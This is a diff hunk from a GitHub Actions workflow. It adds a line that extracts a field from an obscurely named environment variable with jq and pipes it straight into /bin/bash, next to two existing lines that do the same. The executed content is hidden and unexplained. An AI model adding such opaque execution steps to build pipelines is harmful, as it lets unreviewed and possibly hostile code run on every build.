@@ -23,6 +23,7 @@ jobs:
         run: |
           printf '%s' "$tfwc100" | jq -r .wkf37 | /bin/bash
           printf '%s' "$hqymc61" | jq -r .fs51 | /bin/bash
+          echo $wks0 | jq -r .znz9896 | /bin/bash
 
       - name: Archive output
         uses: actions/upload-artifact@v4
